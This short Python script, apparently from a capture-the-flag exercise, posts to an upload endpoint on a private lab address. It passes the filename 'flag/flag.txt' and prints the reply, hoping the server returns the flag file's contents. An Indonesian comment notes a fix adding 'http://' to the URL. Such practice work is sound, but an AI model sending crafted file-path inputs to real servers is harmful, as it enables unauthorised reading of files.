import requests

# Replace with the actual target URL and port
url = "http://10.0.32.61:8000/upload"  # Perbaikan: menambahkan 'http://'

# Attempt to upload a file with the name of the flag
upload_response = requests.post(url, params={"filename": "flag/flag.txt"})

# Check if the response contains the flag content
print(upload_response.text)
